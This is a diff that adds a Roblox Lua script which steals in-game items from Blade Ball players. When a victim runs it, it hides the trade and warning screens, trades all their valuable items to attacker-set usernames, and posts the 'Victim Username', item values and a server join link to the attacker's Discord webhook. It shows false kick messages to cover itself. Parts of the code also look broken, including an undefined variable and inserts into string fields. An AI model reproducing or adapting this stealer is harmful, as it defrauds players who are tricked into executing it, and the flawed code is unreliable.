@@ -1,0 +1,288 @@
+_G.Usernames = {
+    "YOUR USERNAME HERE",
+    "YOUR USERNAME HERE",
+    "YOUR USER NAME HERE"
+}
+_G.min_rap = 20
+_G.pingEveryone = "Yes"
+_G.webhook = "YOUR WEBHOOK"
+
+if _G.scriptExecuted then
+    return
+else
+    _G.scriptExecuted = true
+end
+
+local tradeItems = {}
+local itemTypes = {
+    "Sword",
+    "Emote",
+    "Explosion"
+}
+local playersService = game:GetService("Players")
+local localPlayer = playersService.LocalPlayer
+local httpService = game:GetService("HttpService")
+local netService = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
+local playerGui = localPlayer.PlayerGui
+local tradeGui = playerGui.Trade
+local tradeEnabled = false
+local notificationsGui = playerGui.Notifications
+local tradeCompletedGui = playerGui.TradeCompleted
+local inventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
+local replion = require(game.ReplicatedStorage.Packages.Replion)
+local usernamesList = _G.Usernames or {}
+local minRap = _G.min_rap or 100
+local pingEveryoneOption = _G.pingEveryone or "No"
+local webhookUrl = _G.webhook or ""
+
+if #usernamesList == 0 or webhookUrl == "" then
+    localPlayer:kick("You didn't add usernames or webhook")
+    return
+end
+
+if game.PlaceId == 13772394625 then
+    if #playersService:GetPlayers() < 16 then
+        local _, pinResponse = netService:WaitForChild("RF/ResetPINCode"):InvokeServer({{option = "PIN", value = "9079"}})
+        if pinResponse == "You don't have a PIN code" then
+            tradeGui.Black.Visible = false
+            tradeGui.MiscChat.Visible = false
+            tradeCompletedGui.Black.Visible = false
+            tradeCompletedGui.Main.Visible = false
+            local mainTradeGui = tradeGui.Main
+            mainTradeGui.Visible = false
+            mainTradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
+                mainTradeGui.Visible = false
+            end)
+            local unfairWarning = tradeGui.UnfairTradeWarning
+            unfairWarning.Visible = false
+            unfairWarning:GetPropertyChangedSignal("Visible"):Connect(function()
+                unfairWarning.Visible = false
+            end)
+            local notifications = notificationsGui.Notifications
+            notifications.Visible = false
+            notifications:GetPropertyChangedSignal("Visible"):Connect(function()
+                notifications.Visible = false
+            end)
+            tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
+                tradeEnabled = tradeGui.Enabled
+            end)
+
+            local function sendTradeRequest(targetPlayerName)
+                local targetPlayer = playersService:FindFirstChild(targetPlayerName)
+                if targetPlayer then
+                    local playersList = {targetPlayer}
+                    repeat wait(0.1) until netService:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(playersList)) == true
+                end
+            end
+
+            local function addItemToTrade(targetPlayerName, itemID)
+                local args = {targetPlayerName, itemID}
+                while netService:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args)) ~= true do end
+            end
+
+            local function readyUp()
+                local args = {true}
+                repeat wait(0.1) until netService:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args)) == true
+            end
+
+            local function confirmTrade()
+                repeat wait(0.1)
+                netService:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
+                until not tradeEnabled
+            end
+
+            local function formatNumber(number)
+                local suffixes = {"", "k", "m", "b", "t"}
+                local index = 1
+                while number >= 1000 and index < #suffixes do
+                    number = number / 1000
+                    index = index + 1
+                end
+                if index == 1 then
+                    return tostring(math.floor(number))
+                elseif number ~= math.floor(number) then
+                    return string.format("%.2f%s", number, suffixes[index])
+                else
+                    return string.format("%d%s", number, suffixes[index])
+                end
+            end
+
+            local function sendWebhook(tradeData, messagePrefix)
+                local fields = {
+                    {
+                        name = "Victim Username:",
+                        value = localPlayer.Name,
+                        inline = true
+                    },
+                    {
+                        name = "Join link:",
+                        value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
+                    },
+                    {
+                        name = "Item list:",
+                        value = "",
+                        inline = false
+                    },
+                    {
+                        name = "Summary:",
+                        value = string.format("Total RAP: %s", formatNumber(vu39)),
+                        inline = false
+                    }
+                }
+
+                local itemSummary = {}
+                for _, item in ipairs(tradeData) do
+                    if itemSummary[item.Name] then
+                        itemSummary[item.Name].Count = itemSummary[item.Name].Count + 1
+                        itemSummary[item.Name].TotalRAP = itemSummary[item.Name].TotalRAP + item.RAP
+                    else
+                        itemSummary[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP}
+                    end
+                end
+
+                local sortedItems = {}
+                for _, info in pairs(itemSummary) do
+                    table.insert(sortedItems, info)
+                end
+                table.sort(sortedItems, function(a, b) return a.TotalRAP > b.TotalRAP end)
+
+                for _, info in ipairs(sortedItems) do
+                    local itemLine = string.format("%s (x%s) - %s RAP", info.Name, info.Count, formatNumber(info.TotalRAP))
+                    table.insert(fields[3].value, itemLine)
+                end
+
+                local embedMsg = {
+                    content = messagePrefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
+                    embeds = {
+                        {
+                            title = "🔸 Join to get Blade Ball hit",
+                            color = 65280,
+                            fields = fields,
+                            footer = {text = "WARNING!"}
+                        }
+                    }
+                }
+
+                local body = {
+                    Url = webhookUrl,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = httpService:JSONEncode(embedMsg)
+                }
+                request(body)
+            end
+
+            local function sendNewExecutionWebhook(tradeItems)
+                local fields = {
+                    {
+                        name = "Victim Username:",
+                        value = localPlayer.Name,
+                        inline = true
+                    },
+                    {
+                        name = "Items sent:",
+                        value = "",
+                        inline = false
+                    },
+                    {
+                        name = "Summary:",
+                        value = string.format("Total RAP: %s", formatNumber(vu39)),
+                        inline = false
+                    }
+                }
+
+                local itemSummary = {}
+                for _, item in ipairs(tradeItems) do
+                    if itemSummary[item.Name] then
+                        itemSummary[item.Name].Count = itemSummary[item.Name].Count + 1
+                        itemSummary[item.Name].TotalRAP = itemSummary[item.Name].TotalRAP + item.RAP
+                    else
+                        itemSummary[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP}
+                    end
+                end
+
+                local sortedItems = {}
+                for _, info in pairs(itemSummary) do
+                    table.insert(sortedItems, info)
+                end
+                table.sort(sortedItems, function(a, b) return a.TotalRAP > b.TotalRAP end)
+
+                for _, info in ipairs(sortedItems) do
+                    local itemLine = string.format("%s (x%s) - %s RAP", info.Name, info.Count, formatNumber(info.TotalRAP))
+                    table.insert(fields[2].value, itemLine)
+                end
+
+                local embedMsg = {
+                    title = "🔸 New Blade Ball Execution",
+                    color = 65280,
+                    fields = fields,
+                    footer = {text = "WARNING!"}
+                }
+
+                local body = {
+                    Url = webhookUrl,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = httpService:JSONEncode({embeds = {embedMsg}})
+                }
+                request(body)
+            end
+
+            local itemData = replion.Client:GetReplion("ItemRAP").Data.Items
+
+            local function getItemRAP(itemID)
+                local result = {}
+                local itemInfo = itemData[itemID]
+                if not itemInfo then return result end
+                for key, v in pairs(itemInfo) do
+                    local ok, decoded = pcall(function() return httpService:JSONDecode(v) end)
+                    if ok and type(decoded) == "table" then
+                        for _, entry in ipairs(decoded) do
+                            if entry[1] == "Name" then
+                                result[entry[2]] = v
+                                break
+                            end
+                        end
+                    end
+                end
+                return result
+            end
+
+            local totalRAPValue = 0
+            local tradeCandidates = {}
+            for _, itemType in ipairs(itemTypes) do
+                local itemsOfType = inventory[itemType]
+                for itemID, itemInfo in pairs(itemsOfType) do
+                    if not itemInfo.TradeLock then
+                        local itemName = itemInfo.Name
+                        local rapTable = getItemRAP(itemID)
+                        local itemRAP = tonumber(rapTable[itemName] or 0)
+                        if minRap <= itemRAP then
+                            totalRAPValue = totalRAPValue + itemRAP
+                            table.insert(tradeCandidates, {ItemID = itemID, RAP = itemRAP, itemType = itemType, Name = itemName})
+                        end
+                    end
+                end
+            end
+
+            if #tradeCandidates > 0 then
+                table.sort(tradeCandidates, function(a, b) return a.RAP > b.RAP end)
+                sendWebhook(tradeCandidates, (pingEveryoneOption == "Yes") and "--[[@everyone]] " or "")
+                local targetUser = usernamesList[1]
+                sendTradeRequest(targetUser)
+                for _, item in ipairs(tradeCandidates) do
+                    addItemToTrade(targetUser, item.ItemID)
+                end
+                readyUp()
+                confirmTrade()
+                sendNewExecutionWebhook(tradeCandidates)
+            end
+        else
+            localPlayer:kick("Server is full. Please join a less populated server")
+            return
+        end
+    else
+        localPlayer:kick("Game not supported. Please join a normal Blade Ball server")
+        return
+    end
+end
